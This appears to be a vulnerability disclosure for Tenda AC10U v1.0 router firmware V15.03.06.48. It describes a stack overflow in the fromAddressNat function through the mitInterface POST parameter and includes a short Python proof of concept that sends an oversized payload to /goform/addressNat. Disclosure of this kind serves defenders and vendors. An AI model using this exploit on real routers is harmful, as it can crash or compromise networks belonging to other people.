## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `fromAddressNat` function. The `ifindex` variable receives the `mitInterface` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `mitInterface` can trigger this security vulnerability.

![image-20240313212438566](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313212438566.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addressNat"
payload = b"a"*1000

data = {"mitInterface": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313212310723](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313212310723.png)
